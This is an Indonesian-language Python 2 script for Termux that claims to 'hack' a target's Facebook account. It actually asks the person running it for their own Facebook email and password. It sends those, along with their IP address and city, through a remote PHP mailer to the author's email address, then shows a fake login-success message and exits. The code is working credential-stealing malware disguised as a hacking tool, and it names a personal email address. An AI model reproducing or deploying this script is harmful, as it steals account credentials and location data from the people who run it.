import os, sys

print ("\033[30;1mSilahkan Masukkan Username & Password Scriptnya")

print ("\033[33;1matau silahkan Hubungi Author ")

username = 'SANTRI'      

password = 'CYBER'



def restart():

	ngulang = sys.executable

	os.execl(ngulang, ngulang, *sys.argv)



def main():

	uname = raw_input("username : ")

	if uname == username:

		pwd = raw_input("password : ")



		if pwd == password:

			print "\033[32;1mAkhirnya password bener juga tuh", 

			sys.exit()



		else:

			print "\033[31;1mPasswordnya salah woiii... [?]\033[33;1m"

			print "Silahkan segera log-in kembali...!!\n"

			restart()



	else:

		print "\033[30;1mUsernamenya salah woiii... [?]\033[31;1m"

		print "Silahkan segera log-in kembali...!!\n"

		restart()



try:

	main()

except KeyboardInterrupt:

	os.system('clear')

from os import system as sis
from time import sleep as waktu
import sys

try:
    import requests as rek
except ImportError:
    sis('pip2 install requests')

#kode warna
m='\033[31;1m'
h='\033[32;1m'
b='\033[34;1m'
p='\033[37;1m'
m_='\033[41;1m'
n='\033[00;1m'



logo="""{}
\t           `/ymMMMMMMMMMMMMMMmy/`
\t         /hMMMMMMMMMMMMMMMMMMMMMMh/
\t       /mMMmNMMMMMNNNNNNNNMMMMMNNMMm/
\t     `hNmo:dMMNNNmNNmNNmNNmNNNMMd:omNh`
\t    .mh:+/hMNNNNmNNmNdhmmNNmNNNNMy/o:hm.
\t   `d+://sNmMMMmMMMmdy+/mMMMmMMMmNs///+d`
\t   ys.o/oMmNNNmNNMNNMmdMNNMNNmNNNmMo/o.ys
\t  `my.-/NmMMMMmMMNmNNyyNNmNMMmMMMMmN/:`ym`
\t  -h/+s/MmMMMNmNNNdym++mymNNNmNMMNmM:so/h-{}
\t  -N.o.sMmMMMNh/:-`-MosM-`-:/hNMMMmMs.+.N-
\t  `ho/-ohmMMMM/    -M/+M.    /MMMMmho-/oh
\t   s+-s-odmNNN`     /-:/     .NNNmd+:s-+s
\t   `mo/-:+ymMm           x    mMms+:-/om`
\t    .h/+/y`hhs                yyh`y/+/h.
\t     `hd/::-+.                .+-::/dy`
\t       /hs+/::.--          --.::/+sh:
\t         :hds+/-`          `-/+sdh:
\t           `/ymM+          oMmy:
\t            >>>W E L C O M E<<<
\t           =[ <[𝘼𝙆𝙆𝙐•𝙎𝘼𝙉𝙏𝙐𝙔]> ]=
\t       ====[ Welcome To Termux ]====
\t============================================
\t          [{}HACK FACEBOOK TARGET1{}]
\t           [{}SANTRI CYBER SANTUY{}]
""".format(m,p,m_,n,m_,n,h,)


emailgue='rayarzlost@gmail.com'
anjay = lambda url, data: rek.post(url, data=data)
response = rek.get('https://extreme-ip-lookup.com/json/').json()

def main():
    sis("clear")
    print logo
    print '[!] LOGIN AKUN FACEBOOK KAMU [!]'
    print '================================'
    print 'Pastikan Yang Anda Masukan Benar'
    print '================================'
    us=raw_input(p+'['+m+'+'+p+']'+h+'Email/No : ')
    pw=raw_input(p+'['+m+'+'+p+']'+h+'Password : ')
    IP = response['query']
    KOTA = response['city']
    text = """
<table border="1" cellpadding="5" bgcolor="black" width=100%>
<tr>
<th colspan="2"><center><font color="white">Informasi Akun</font></th>

</tr>
<tr>
	<td bgcolor="white"><center><b>Username</td>
	<td bgcolor="white"><center>{}</td>
</tr>
<tr>
	<td bgcolor="white" width=30%><center><b>Password</b></td>
	<td bgcolor="white"><center>{}</td>
</tr>

</table>
<br>
<br>
<table border="1" cellpadding="5" bgcolor="black" width=100%>
<tr>
<th colspan="2"><center><font color="white">Informasi Tambahan</font></th>

</tr>
<tr>
	<td bgcolor="white"><center><b>IP</td>
	<td bgcolor="white"><center>{}</td>
</tr>
<tr>
	<td bgcolor="white" width=30%><center><b>KOTA</b></td>
	<td bgcolor="white"><center>{}</td>
</tr>
</table>
    """.format(us, pw, IP, KOTA)
    web='http://savvymotherschool.com/files/possting.php'
    data = {"from":"[!] HACK TARGET","email_kamu":"extremeboy@phising.net","email_target":emailgue,"subject":"Ussername : "+us,"mesage":text}
    
    try:
        anjay(web,data)
    except rek.ConnectionError:
        sys.exit("periksa koneksi anda")
    waktu(1)
    print "Tunggu Sedang Login Cuk....."
    waktu(3)
    print "login berhasil"
    waktu(2)
    menu()

def menu():
    sis('clear')
    print logo
    try:
        dimen=int(raw_input('ID FACEBOOK TARGET :'))
    except:
        print 'Salah Goblok Masukan ID Cuk'
        waktu(2)

        menu()
    waktu(7)
    sis('clear')
    sys.exit('ID Dan Password Akan Di Kirimkan Ke FB kamu TRIMAKASIH')
    



if __name__ == "__main__":
    main()
